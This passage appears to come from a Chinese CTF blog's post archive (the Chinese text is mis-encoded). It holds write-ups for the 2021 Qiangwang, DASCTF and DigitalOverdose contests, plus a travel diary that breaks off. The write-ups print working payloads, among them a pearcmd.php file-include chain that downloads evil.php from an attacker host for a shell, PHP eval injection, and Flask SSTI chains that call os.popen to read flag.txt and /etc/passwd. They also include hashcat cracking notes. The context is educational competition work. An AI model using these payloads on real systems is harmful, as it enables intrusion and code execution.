å…¥å‚æ•°æ¥åšåˆ°æ–‡ä»¶åŒ…å«ï¼ˆæ¯”å¦‚include $_GET['f'].phpï¼‰ å¯ä»¥å‡ºç½‘ æˆ‘ä»¬å°±å¯ä»¥åšåˆ°ä»»æ„æ–‡ä»¶ä¸‹è½½ä»è€Œgetshellï¼›å‰é¢ä¹Ÿæåˆ°register_argc_argvç»§ç»­PHP_IN_PREDIRï¼Œæˆ‘ä»¬å¯ä»¥ç•™ä¸€ä¸ª.user.iniçš„åé—¨æ¥è®¾ç½®register_argc_agrvä¸ºOn\npayloadå°±æ˜¯è¿™æ ·äº†\n// å­˜åœ¨ include $_GET[\u0026#39;f\u0026#39;].php // webç›®å½•å¯å†™ - http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd\u0026amp;+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmpç›®å½•å¯å†™ - http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd\u0026amp;+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil é¦–å…ˆè¦åŒ…å«ä¸€ä¸ªæ­£ç¡®ä½ç½®çš„pearcmd.phpï¼ˆé€šå¸¸åœ¨/usr/local/lib/php/pearcmd.phpï¼‰ï¼Œæ¥ç€åŒ…å«\u0026amp;+download+http://your_vps/eval.phpï¼ˆæˆ–è€…å¦‚æœå‰é¢ç›´æ¥æ˜¯/pearcmd.phpçš„è¯å°±å¯ä»¥ç›´æ¥ç»™å‚æ•°äº†/pearcmd.php+download+http://your_vps/eval.phpï¼‰æ¥è£…ğŸï¼ˆæ³¨æ„è·¯å¾„æ˜¯å¦æ­£ç¡®ï¼‰ï¼Œä¹‹åå†åŒ…å«æˆ‘ä»¬çš„ğŸå³å¯\nå…¶å®ƒçš„ä¾‹é¢˜ [CampCTF 2015] Trolol\n[å·…å³°æå®¢ 2020] MeowWord\n[RCTF 2021] VerySafe\nè¿˜æ˜¯åšçš„é¢˜ä¸å¤Ÿå¤šï¼Œå·²æœ‰çš„çŸ¥è¯†ä¹Ÿåº”ç”¨çš„ä¸å¤Ÿç†Ÿç»ƒï¼Œå®åœ¨æ˜¯å¤ªå¤ªå¤ªå¤ªå¤ªèœäº†ï¼Œå¾—å¥½å¥½å­¦ï¼Œä¸èƒ½å¤©å¤©åˆ’æ°´æ‘¸é±¼\n","date":"2021-10-26T20:17:24+08:00","permalink":"https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/","section":"posts","tags":["wp"],"title":"2021å¼ºç½‘æ‹Ÿæ€ Wp"},{"categories":["CTF"],"contents":"Web/è¿·è·¯çš„é­”æ³•å°‘å¥³ é­”æ³•å°‘å¥³è¿·å¤±åœ¨äº†ä»£ç ç©ºé—´ è¯·å¯»æ‰¾å¥¹ç°åœ¨åœ¨å“ª\n\u0026lt;?php highlight_file(\u0026#39;index.php\u0026#39;); extract($_GET); error_reporting(0); function String2Array($data) { if($data == \u0026#39;\u0026#39;) return array(); @eval(\u0026#34;\\$array = $data;\u0026#34;); return $array; } if(is_array($attrid) \u0026amp;\u0026amp; is_array($attrvalue)) { $attrstr .= \u0026#39;array(\u0026#39;; $attrids = count($attrid); for($i=0; $i\u0026lt;$attrids; $i++) { $attrstr .= \u0026#39;\u0026#34;\u0026#39;.intval($attrid[$i]).\u0026#39;\u0026#34;=\u0026gt;\u0026#39;.\u0026#39;\u0026#34;\u0026#39;.$attrvalue[$i].\u0026#39;\u0026#34;\u0026#39;; if($i \u0026lt; $attrids-1) { $attrstr .= \u0026#39;,\u0026#39;; } } $attrstr .= \u0026#39;);\u0026#39;; } String2Array($attrstr); /?attrid[]=\u0026amp;attrvalue[]=\u0026#34;);phpinfo();// å‚è€ƒï¼šCG-CTF å˜é‡è¦†ç›–(PHP extractå‡½æ•°åˆ©ç”¨) | CTF-PHPé»‘é­”æ³•\nMisc/WELCOME DASCTFxJlenu æ¬¢è¿æ¥åˆ°é­”æ³•çš„ä¸–ç•Œï¼ˆç­¾åˆ°ï¼‰\nå¯æ˜¯æœ‰å‡ å±‚åŒ…æµ†çš„åŸé¢˜äº†å±äºæ˜¯ï¼Œä¹‹å‰ç»å¯¹åšè¿‡ä¸€æ¬¡\n","date":"2021-10-24T16:47:40+08:00","permalink":"https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/","section":"posts","tags":["wp"],"title":"DasCTF1021 Wp"},{"categories":["CTF"],"contents":"Web/git commit -m \u0026ldquo;whatever\u0026rdquo; Visit the website\nemmmm è”ç³»è¿™ä¸ªé¢˜ç›® è®¿é—®ä¸€ä¸‹.gitçœ‹çœ‹æœ‰æ²¡æœ‰å¤‡ä»½æ–‡ä»¶æ³„éœ²\nç”¨GitHackerä¸‹è½½æ³„éœ²çš„gitæ–‡ä»¶ï¼Œæœ‰ä¸€ä¸ªindex.php\n\u0026lt;?php /** * Simple sodium crypto class for PHP \u0026gt;= 7.2 * @author MRK */ class crypto { /** * * @return type */ static public function create_encryption_key() { return base64_encode(sodium_crypto_secretbox_keygen()); } /** * Encrypt a message * * @param string $message - message to encrypt * @param string $key - encryption key created using create_encryption_key() * @return string */ static function encrypt($message, $key) { $key_decoded = base64_decode($key); $nonce = random_bytes( SODIUM_CRYPTO_SECRETBOX_NONCEBYTES ); $cipher = base64_encode( $nonce . sodium_crypto_secretbox( $message, $nonce, $key_decoded ) ); sodium_memzero($message); sodium_memzero($key_decoded); return $cipher; } /** * Decrypt a message * @param string $encrypted - message encrypted with safeEncrypt() * @param string $key - key used for encryption * @return string */ static function decrypt($encrypted, $key) { $decoded = base64_decode($encrypted); $key_decoded = base64_decode($key); if ($decoded === false) { throw new Exception(\u0026#39;Decryption error : the encoding failed\u0026#39;); } if (mb_strlen($decoded, \u0026#39;8bit\u0026#39;) \u0026lt; (SODIUM_CRYPTO_SECRETBOX_NONCEBYTES + SODIUM_CRYPTO_SECRETBOX_MACBYTES)) { throw new Exception(\u0026#39;Decryption error : the message was truncated\u0026#39;); } $nonce = mb_substr($decoded, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, \u0026#39;8bit\u0026#39;); $ciphertext = mb_substr($decoded, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, null, \u0026#39;8bit\u0026#39;); $plain = sodium_crypto_secretbox_open( $ciphertext, $nonce, $key_decoded ); if ($plain === false) { throw new Exception(\u0026#39;Decryption error : the message was tampered with in transit\u0026#39;); } sodium_memzero($ciphertext); sodium_memzero($key_decoded); return $plain; } } $privatekey = \u0026#34;mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=\u0026#34;; $flag = file_get_contents(\u0026#39;../flag.txt\u0026#39;); $enc = crypto::encrypt($flag, $privatekey); echo $enc; ?\u0026gt; åŒ…å«äº†è§£å¯†çš„æ¨¡å—ï¼Œæ‰€ä»¥ç”¨å®ƒè§£å¯†ä¸€ä¸‹å³å¯\nâ€”â€”â€”â€”è¿™é‡Œæˆ‘çš„æœ¬åœ°phpä¸€ç›´å‡ºé—®é¢˜ ç‰ˆæœ¬7.3.4å’Œ7.4.21éƒ½æŠ¥é”™\nWeb/notrequired Hello I am cheemsloverboi33! I made a php website. Can you do a quick security check on it?\næ³¨æ„åˆ°é“¾æ¥æ˜¯http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html\nç”¨ä¼ªåè®®çœ‹ä¸€ä¸‹index.phpçš„æºç /index.php?file=php://filter/convert.base64-encode/resource=index.php\nè®¿é—®/bin/secrets.txtï¼Œå¾—åˆ° QlVIQ3tyM3F1MXIzXzFzX3MwbTN0aDFuZ185MDkxMDI5MTMwKCk4MTEyOTM4MTIxfQ==\nBUHC{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}\nWeb/madlib I just created the first draft of my first flask project, a madlib generator that fills the given words into a madlib template!\nTry it out and let me know what you think! The character length limit should make this app pretty secure.\nä¸€ä¸ªflaskçš„webapp\nå…ˆçœ‹ä¸‹æºç \nfrom flask import Flask, render_template_string, request, send_from_directory app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def index(): return send_from_directory(\u0026#39;html\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/madlib\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def madlib(): if len(request.json) == 5: verb = request.json.get(\u0026#39;verb\u0026#39;) noun = request.json.get(\u0026#39;noun\u0026#39;) adjective = request.json.get(\u0026#39;adjective\u0026#39;) person = request.json.get(\u0026#39;person\u0026#39;) place = request.json.get(\u0026#39;place\u0026#39;) params = [verb, noun, adjective, person, place] if any(len(i) \u0026gt; 21 for i in params): return \u0026#39;your words must not be longer than 21 characters!\u0026#39;, 403 madlib = f\u0026#39;To find out what this is you must {verb} the internet then get to the {noun} system through the visual MAC hard drive and program the open-source but overriding the bus won\\\u0026#39;t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card {adjective}.{person} taught me this trick when we met in {place} allowing you to download the knowledge of what this is directly to your brain.\u0026#39; return render_template_string(madlib) return \u0026#39;This madlib only takes five words\u0026#39;, 403 @app.route(\u0026#39;/source\u0026#39;) def show_source(): return send_from_directory(\u0026#39;/app/\u0026#39;, \u0026#39;app.py\u0026#39;) app.run(\u0026#39;0.0.0.0\u0026#39;, port=1337) çœ‹åˆ°äº†ç†Ÿæ‚‰çš„æ¨¡æ¿æ¸²æŸ“ï¼ˆè¯­æ®µæ¥è‡ªäºu/masterhacker_botï¼‰ï¼Œåªä¼šæ¸²æŸ“ç‰¹å®šçš„ä½ç½®ï¼Œè€Œä¸”æœ‰ä¸ªç‰¹æ®Šçš„{adjective}.{person}\nå­˜åœ¨5ä¸ªå¯ä»¥sstiçš„åœ°æ–¹ï¼Œä½†æ˜¯é™åˆ¶æ¯ä¸€ä¸ªæ¡†å­—ç¬¦æ•°å¿…é¡»åœ¨21ä¸ªä¹‹å†…ï¼›å…¶ä¸­è¿˜æœ‰ä¸¤ä¸ªéå¸¸ç‰¹æ®Šçš„{adjective}.{person}è¿äº†èµ·æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ª.ç‚¹å·è¿æ¥æˆ‘ä»¬payloadçš„é•¿åº¦\nè¿™æ ·ç›¸å½“äºæœ‰4ä¸ªå¯ä»¥æ„é€ çš„åœ°æ–¹ï¼Œå‰ä¸¤ä¸ªç”¨æ¥å°†é•¿é•¿çš„payloadç”¨çŸ­çš„å˜é‡åŠé€†è¡Œæ›¿æ¢ï¼Œç¬¬ä¸‰ä¸ªæ˜¯payloadæœ¬ä½“ï¼Œç¬¬ä¸‰å’Œç¬¬å››ä¸ªä½ç½®å‡æ˜¯å›æ˜¾ä½ï¼›é¦–å…ˆé€šè¿‡config.updateæ–¹æ³•ä¸æ–­åœ°å‘åå–å€¼æ¥æ‹¿åˆ°å¯ä»¥ç”¨çš„å‡½æ•°å¹¶å°†å…¶å­˜å‚¨åœ¨config.aä¸­ï¼Œä¹‹åè°ƒç”¨å®ƒæ¥rce\n{%set x=config%} {%set y=x.update%} {{y(a=x __class__.__init__)}} {{config.a}} å›æ˜¾\u0026lt;function Config.__init__ at 0x7fd75dae31e0\u0026gt;ï¼Œç°åœ¨æˆ‘ä»¬è®¾æ³•è°ƒç”¨å‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤\n{{y(a=x.a __globals__[\u0026#39;os\u0026#39;])}} å›æ˜¾\u0026lt;module 'os' from '/usr/local/lib/python3.6/os.py'\u0026gt;\n{{y(a=x.a popen)}} å›æ˜¾\u0026lt;function popen at 0x7fd75ed5a730\u0026gt;ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„config.aå°±æ˜¯os.popen()ï¼Œç°åœ¨æ¥è°ƒç”¨å®ƒæ¥æ‰§è¡Œå‘½ä»¤\n{%set x=config%} {%set y=x.a%} {{y(\u0026#39;uname -a\u0026#39;) read()}} {{config.a}} å›æ˜¾Linux madlib-digitaloverdose:madlib-46bf3bc4 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 GNU/Linuxï¼ŒæˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼Œæ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ï¼Œè¯»ä¸€æ³¢flag\n{{y(\u0026#39;cat flag.txt\u0026#39;) read()}} DO{an0th3r_ssti_ch4ll3nge_l0l593deff6}\nâ€”â€”â€”â€”å¾ˆå¹¸è¿çš„æ˜¯æœ€åæˆ‘ä»¬çš„payloadæ­£å¥½å°äº21ä¸ªå­—ç¬¦ï¼Œæ˜¾ç„¶æˆ‘ä»¬è¢«é•¿åº¦é™åˆ¶äº†å‘æŒ¥ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æœ‰åˆ«çš„trick\nJinjaä¸ä»…æ”¯æŒæ¨¡æ¿å†…éƒ¨çš„å˜é‡èµ‹å€¼è¿˜æ”¯æŒ~è¿›è¡Œå­—ç¬¦ä¸²çš„è¿æ¥ï¼Œå†åˆ©ç”¨ä¸Šconfig.commandç”šè‡³èƒ½è¯»å‡º/etc/passwd\n{%set x=config%} {%set y=x.update%} {%set p=\u0026#39;cat /etc\u0026#39;%} {%set q=p~\u0026#39;/passw\u0026#39;%} {{y(b=q~\u0026#39;d\u0026#39;)}} {%set x=config%} {%set y=x.a%} {%set z=config.b%} {{z}} {{y(z).read()}} å‚è€ƒï¼šDigital Overdose 2021 Autumn CTF Writeup â€” madlib (web)\nLog Analysis/Part1 - Ingress Our website was hacked recently and the attackers completely ransomwared our server!\nWe\u0026rsquo;ve recovered it now, but we don\u0026rsquo;t want it to happen again.\nHere are the logs from before the attack, can you find out what happened?\nç»™å‡ºäº†è®¿é—®æ—¥å¿—ï¼Œæœ‰åºå¤§çš„æ•°æ®ï¼Œnè¡Œ~~ï¼Œä½†æ˜¯ä¸å¤ªä¼šçœ‹~~\nåœ¨37557è¡Œå‡ºç°äº†è®¿é—®/ywesusnz cmd%3Dcd+..ï¼Œå¾€åè¿˜æœ‰ä¸€äº›ywesusnzå¼€å¤´çš„ï¼Œ37629è¡Œå‡ºç°äº†/ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==ï¼Œb64è§£å¯†\nDO{better_remove_that_backdoor}\nLog Analysis/Part 2 - Investigation Thanks for finding the RFI vulnerability in our FAQ. We have fixed it now, but we don\u0026rsquo;t understand how the attacker found it so quickly.\nWe suspect it might be an inside job, but maybe they got the source another way. Here are the logs for the month prior to the attack, can you see anything suspicious?\nPlease submit the attackers IP as the flag as follow, DO{x.x.x.x}\nä»ç„¶æ˜¯ç»™å‡ºäº†å¾ˆå¤šè¡Œçš„æ—¥å¿—\nå‘ç°äº†å¯ç–‘çš„å†…å®¹DO{45.85.1.176} ä½†æ˜¯æäº¤flagé”™è¯¯\nï¼ˆç„¶åå‘ç°æ˜¯å¾ˆå‚»é€¼çš„æŠŠ200.13.84.124å½“ä½œflagäº¤äº†â€¦â€¦\nLog Analysis/Part 3 - Backup Policy So it looks like the attacker scanned our site for old backups right? Did he get one?\næ¥ç€æ‰¾ï¼Œå‘ç°äº†/backup.zipçš„è¯·æ±‚æ˜¯200ok\nä½†æ˜¯äº¤flagçš„æ—¶å€™ä¸çŸ¥é“äº¤å•¥ï¼Œçœ‹äº†wpæ‰å‘ç°è—åœ¨äº†UAå¤´é‡Œ\nMozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 å°†ä¸­é—´é‚£ä¸€ä¸²b64è§£å¯†åå¾—åˆ°\nDO{s3cr3t___agent}\nSource Analysis/A1 - C-nanigans Find the flag parts in the source code, assemble the flag, submit the flag.\n(This code may not compile, and it is useless to attempt to do so)\næç¤ºæˆ‘ä»¬å…³æ³¨æºç è€Œä¸æ˜¯ç¼–è¯‘\n444f7b 733075526333 5f406e616c79333173 7d hexè§£å¯†åå¾—åˆ°DO{s0uRc3_@naly31s}\nHash Cracking/Hash 1 54a09c22fc0d1af44865e411ff6e8d50 phantomlover\nHash Cracking/Hash 2 52ed4b109a2662fdf15edfd95632667869fc5802 fishchips\nHash Cracking/Hash 3 550b57fc03f0a800fab603cb8eb4e29fbd5c76655d7ab995b1fe9c6ddf963a3d2627ebd79e067022f792bb2490a260c051aecbc4a7aedb3ec5dbf9439cd66f81 mommadobbins\nHash Cracking/Hash 4 451716a045ca5ec7f25e191ab5244c61aaeeb008c4753a2065e276f1baba4723 Hash Identifier\nhashcat -m 6900 ghost\nhappyfamily\nHash Cracking/Hash 5 $2a$10$QlR/ZlXgQPWfx9JmRffMZutcL3o3w6JAiRbfvGda4u09lrfOvgcH6 hashcat -m 3200 bcrypt\ncowabunga\nHash Cracking/Hash 6 $1$veryrand$QetWu27IoJ2FFSG30xKAQ. Hash Analyzer\nhashcat -m 500 MD5-Crypt\nscottiebanks\nHash Cracking/Hash 7 $6$veryrandomsalt$t8EIWEiDpWYzeC1c44q7f6ZENOuO2wagnrJBPs4d/PptWxAxlnH7qRcf0xnKagaOEHBN9dGBV5Y1syJSB3s6H1 hashcat -m 1800 sha512crypt $6$\nigetmoney\nå¾ˆæ°´çš„wpï¼Œæˆ–è€…è¯´æ˜¯å¤ç°ï¼Œæ²¡æœ‰ä»€ä¹ˆå‚è€ƒä»·å€¼ï¼›æŒºæœ‰æ„æ€çš„é¢˜ï¼Œå­¦åˆ°äº†sstiçš„æ–°trickï¼›Source Analysisçš„å‰©ä¸‹ä¸¤ä¸ªé¢˜å…¨æ˜¯web+reverse/crypto/pwnï¼ˆæŒ‡è·¯wp: Boris | I think this could be C4ï¼‰ï¼Œè°¢è°¢ï¼Œå®Œå…¨çœ‹ä¸æ‡‚ï¼Œå·²ç»è·ªäº†\nwebç‹—æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡\nğŸ˜…\n","date":"2021-10-22T11:54:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/","section":"posts","tags":["wp"],"title":"DigitalOverdoseCTF2021 Wp"},{"categories":[],"contents":"æ¯”èµ›å‰ä¸€å¤©/15å· ä¸‹åˆ2ç‚¹50çš„é£æœºï¼Œç»“æœä¸´å‡ºå­¦æ ¡å‰å‘ç°èº«ä»½è¯ä¸¢äº†ï¼Œè´¼å°´å°¬ï¼Œæ‰¾äº†ä¸¤åœˆæ²¡æ‰¾åˆ°å°±ç›´æ¥å»æœºåœºäº†ï¼Œç”¨ä¸´æ—¶èº«ä»½è¯æ˜ä¸Šäº†é£æœºä¹‹åæ”¶åˆ°ç”µè¯è¯´èº«ä»½è¯è¢«æ¡åˆ°äº†orz è¿™ä¹ˆä½çº§çš„é”™è¯¯ä¸‹æ¬¡ç»ä¸ä¼šæœ‰äº†TAT\nåˆ°éƒ‘å·ä¹‹åæ‰“æ»´æ»´ç»“æœå¸æœºç”µè¯æ‰“ä¸é€šï¼Œåˆæ­£å¥½ä¸‹é›¨ï¼Œè·Ÿé˜Ÿå‹ä¸€èµ·ä¸Šäº†ä¸ªæ‰“è¡¨é£å¿«çš„å°é»‘è½¦ï¼Œåˆ°åœ°é“ç«™é—¨å£å°±148å—é’±ï¼Œè¿˜å¥½æœ€ååªç»™äº†100ï¼Œä½†æ˜¯ä¹Ÿå¤ªä»–å¦ˆçš„å‘äº†\nä¹‹åæŒ¤äººè´¼å¤šçš„åœ°é“ï¼Œå…ˆå»é…’åº—é™„è¿‘çš„æ´¾å‡ºæ‰€å¼€äº†ä¸ªè¯æ˜ï¼Œç„¶ååˆ°é…’åº—ä½ä¸‹ï¼Œé¥­è¿˜è¡Œï¼Œæ˜¯1å±‚è‡ªåŠ©é¤ï¼Œæˆ‘è·Ÿå¦ä¸€ä¸ªå°å§å§ä½ä¸€ä¸ªæˆ¿é—´\næ¯”èµ›ç¬¬ä¸€å¤©/16å· æ—©ä¸Šèµ·æ¥ä¹‹åè·ŸåŒé˜Ÿçš„ä¸¤ä¸ªå¸ˆå‚…å»ç§‘æŠ€é¦†ç­¾åˆ°ï¼Œé¢†è¡£æœå’Œå‚èµ›è¯ï¼ˆé‚£è¾¹çš„å¿—æ„¿è€…æ˜¯éƒ‘å·ä¸­å­¦çš„å°å§å§ä»¬ï¼Œé¢œå€¼è¶…é«˜\nç„¶åå½©æ’äº†ä¸€ä¸‹é€‰æ‰‹å‘è¨€ï¼Œå›å»åƒä¸­é¥­ï¼ˆé»˜é»˜åæ§½ä¸€ä¸‹æŸå‡ ä½å¸ˆå‚…å»å‚è§‚ç§‘æŠ€é¦†æ²¡å¸¦æˆ‘ç©è¿™ä»¶äº‹äº†ï¼ï¼ï¼è®°ä»‡ = =ã€‚\n3ç‚¹åŠå¼€å¹•å¼ï¼Œæˆ‘é»˜é»˜åšäº†ä¸ªé€‰æ‰‹ä»£è¡¨å‘è¨€ï¼ˆè¡¨æƒ…ç®¡ç†å¤§å¤±è´¥ æ‰€æœ‰ç…§ç‰‡éƒ½æ‹å¾—è´¼ä¸‘ï¼‰\n4ç‚¹å¼€èµ›ï¼ŒçœŸä¸æ„§æ˜¯è·‘ç”·æ¨¡å¼ï¼ŒæŠŠæˆ‘ä¸€æ•´å¹´çš„è¿åŠ¨é‡éƒ½ç»™è·‘å®Œäº†ï¼ŒæˆåŠŸå…‹æœäº†ä¸æ•¢åæ‰‹æ‰¶ç”µæ¢¯çš„ææƒ§ç—‡ï¼Œç§‘æŠ€é¦†4å±‚ä¸Šä¸‹æ¥å›è·‘\næœ€å¼€å§‹ç»™çš„é¢˜æ˜¯è¦åœ¨ç§‘æŠ€é¦†ä¸­æ‰¾åˆ°5å¼ å›¾ç‰‡ä¸Šçš„åœ°æ–¹å¹¶ä¸”æ‹ç…§ï¼Œè¿™æ˜¯æœ€è€—ä½“åŠ›çš„ï¼Œè·‘ç€è·‘ç€å°±è¿·è·¯äº†ï¼ˆåæ¥æƒ³çš„è¯ï¼Œè¿™ä¸ªç¯èŠ‚åˆä¸ç»™åˆ†ï¼Œä¸€å¼€å§‹å°±è½æœ‰ç‚¹è‰ç‡ï¼Œå¯ä»¥ç›´æ¥åšåˆ«çš„é¢˜ï¼‰\nç„¶ååé¢çš„é¢˜åˆ†æ•£åœ¨1234å±‚ï¼Œæœ‰çš„é¢˜æ˜¯åªèƒ½åšä¸€æ¬¡ä½†æ˜¯ä¸é™æ—¶ï¼Œæœ‰çš„æ˜¯é™æ—¶åˆåªèƒ½ä¸€æ¬¡ï¼Œæ ¹æ®è§£å‡ºçš„ç¨‹åº¦ç»™å¡ç‰‡ï¼ŒæŠŠä¸Šé¢çš„æˆè¯­ä½œä¸ºflagäº¤åˆ°å¹³å°ä¸Š\nè¯´è¯´å‡ ä¸ªå°è±¡æ·±åˆ»çš„é¢˜å§ï¼Œç«ç„°ç†Šç†Šï¼Œçº¢è‰²é©å‘½é˜…è¯»ç†è§£é¢˜ï¼Œç»™å‡ å¼ çº¸é˜…è¯»å±•æ¿ä¸Šçš„å†…å®¹ç„¶åç­”é¢˜ï¼Œä¸å¤ªå¥½æ‰¾ï¼Œæ‹¿äº†1600åˆ†ï¼Œ10åˆ†é’Ÿä¸å¤ªå¤Ÿç”¨ï¼Œæœ‰å‡ ä¸ªæ˜¯è’™ä¸Šå»çš„\né˜¿å°¼ç›æ ¼æ–¯ï¼Œåˆšå¼€å§‹æˆ‘è¿‡å»ä¹‹åä¸€çœ‹é¢˜ç›®æè¿°ï¼Œå¥½å®¶ä¼™ï¼Œæ‹Ÿæ€ï¼Œè¿˜æ˜¯åªèƒ½åšä¸€æ¬¡ï¼Œæˆ‘å°±å…ˆèµ°äº†ï¼Œåé¢å†è¿‡æ¥åšçš„æ—¶å€™å‘ç°è¿™ä»–å¦ˆä¹Ÿæ˜¯ä¸ªé˜…è¯»ç†è§£é¢˜ï¼Œè‰ï¼Œè¿˜æ˜¯æœ¬ç«¥è¯ä¹¦ï¼Œå…¨ç¨‹ç½šæŠ„å†™\né˜¿æ‹‰éœæ´å¼€ï¼ŒåŒªå¤·æ‰€æ€çš„é¢˜ï¼Œä»¥ä¸ºæ˜¯æ‰“å¼€å­˜åŒ…æŸœï¼Œæ²¡æƒ³åˆ°å°±æ˜¯æˆ³å¼€å·¦ä¸‹è§’çš„å¼€å§‹ï¼Œç„¶åç‚¹å¼€æ–‡ä»¶å¤¹\nè¿˜æœ‰ä¸ªé¢˜æ˜¯æ‰¾æ‘„åƒå¤´ï¼Œå¿˜äº†å«å•¥åå­—äº†ï¼Œè¯´æ˜¯æœ‰180ä¸ªæ‘„åƒå¤´ï¼Œå‰5åˆ†é’Ÿè‚‰çœ¼çœ‹ï¼Œå5åˆ†é’Ÿèƒ½æ‹¿çº¢å¤–çº¿çš„æ‰«ææªï¼Œåæ­£æ˜¯å°½å¯èƒ½å¾€å¤šäº†åœˆï¼ˆx\né©±é€éº»ç“œæ˜¯ä¸¤ä¸ªé¢˜ï¼Œä¸€ä¸ªæ˜¯å¯†ç ï¼Œä¸ä¼šè§£ï¼Œphpçš„æ”¾åˆ°æœ€åæ²¡æ—¶é—´çœ‹\nå¾ˆæ— è¯­çš„æ˜¯ä¸€äº›é¡¹ç›®å› ä¸ºåœºåœ°é™åˆ¶è¿˜éœ€è¦æ’é˜Ÿï¼Œæˆ‘ä»¬æ’åˆ°é˜¿æ‹‰éœæ´å¼€è¿™ä¸ªé¢˜çš„æ—¶å€™ç¦»ç»“æŸå°±å‰©10åˆ†é’Ÿäº†ï¼Œè¿˜å¥½è§£çš„æ¯”è¾ƒå¿«\nä¸­é—´æˆ‘ä»¬é˜Ÿæœ€é«˜åˆ°ç¬¬2åï¼Œæœ€åæˆªæ­¢çš„æ—¶å€™æ˜¯ç¬¬10ï¼Œ8000åˆ†ï¼Œåˆšå¥½æŒ‚åˆ°å¤§å±å¹•ä¸Š\næ¯”å®Œä¹‹åå¥½å¤šé˜Ÿéƒ½æ¢äº†å¤´åƒå’Œç­¾åï¼Œäºæ˜¯æˆ‘ä»¬æ¢äº†è¿™ä¸ª\nåƒå®Œé¥­å°±8ç‚¹äº†ï¼Œå›å»å‡†å¤‡ç¬¬äºŒå¤©çš„break\u0026amp;fix\næ¯”èµ›ç¬¬äºŒå¤©/17å· æ—©ä¸Š7ç‚¹åŠå°±å¼€å§‹æ¯”ï¼Œ6ç‚¹åŠèµ·åºŠï¼Œå›°å¾—ä¸€æ‰¹åˆæ²¡èƒƒå£ï¼Œåƒäº†ä¿©è›‹ç³•æ‹¿äº†ä¸ªé…¸å¥¶å°±å»ä¼šåœºäº†\nåŒ†å¿™è¿ä¸Šç½‘çº¿ï¼Œçœ‹äº†æ¯”èµ›æ‰‹å†Œï¼Œawdpæ¨¡å¼ï¼Œæ”¾äº†4é“é¢˜ï¼Œä¸¤ä¸ªpwnä¸¤ä¸ªweb\né¦–å…ˆæ„Ÿè°¢ä¸€ä¸‹pwnğŸ‘´æ—ºæ—ºå¸ˆå‚… ä¸¤ä¸ªé¢˜å…¨å‡ºäº† ååˆ†nb\nwebæ–¹é¢ï¼Œä¸€ä¸ªæ˜¯phpååºåˆ—åŒ–ï¼ˆæ€ä¹ˆè€æ˜¯ä½ ï¼‰ å…¨åœº0è§£ï¼ˆç”¨åˆ°äº†åŸç”Ÿç±»çš„ä¸€ä¸ªç‰¹æ€§ å¯ä»¥å‚è€ƒè¿™ä¸ªé¢˜[NepCTF 2021]æ¢¦é‡ŒèŠ±æ¥ç‰¡ä¸¹äº­ï¼‰ï¼Œä¸€ä¸ªæ˜¯flaskçš„sstiæ³¨å…¥ï¼Œä¸€å¼€å§‹ä¹Ÿæ˜¯0è§£ï¼Œä½†æ˜¯ä¸æ–­çš„æ”¾hintéƒ½æ²¡äººgetåˆ°ä»–çš„æ„æ€ï¼Œç›´åˆ°æœ€åæŠŠpayloadéƒ½ç»™æ”¾å‡ºæ¥äº†æ‰å¼€å§‹æœ‰è§£ï¼Œå¯èƒ½æ˜¯æƒ³çš„ç­¾åˆ°éš¾åº¦ï¼Œä½†æ˜¯å¤§å®¶æ²¡ç­¾ä¸ŠğŸ˜…\nï¼ˆpayloadæ˜¯{{lipsum['__globals__']['__builtins__']['eval']('__import__(\u0026quot;os\u0026quot;).popen(\u0026quot;ls /\u0026quot;).read()')}} ï¼‰\nç„¶åæ˜¯fixé˜¶æ®µï¼Œæˆ‘ä¿®äº†phpï¼Œå¦ä¸€ä½å¸ˆå‚…ä¿®äº†flaskï¼ŒpwnğŸ‘´ä¿®äº†ä¸€é“pwnï¼ˆå¦ä¸€ä¸ªæ²¡æœ‰è¿‡check\né˜²å¾¡é˜¶æ®µçš„åˆ†åŠ çš„ç‰¹åˆ«å¿«ï¼Œä¿®äº†ä¸¤ä¸ªé¢˜ç›´æ¥å°±å¹²åˆ°ç¬¬ä¸€äº†\nï¼ˆå¿½ç•¥æ—¶é—´ 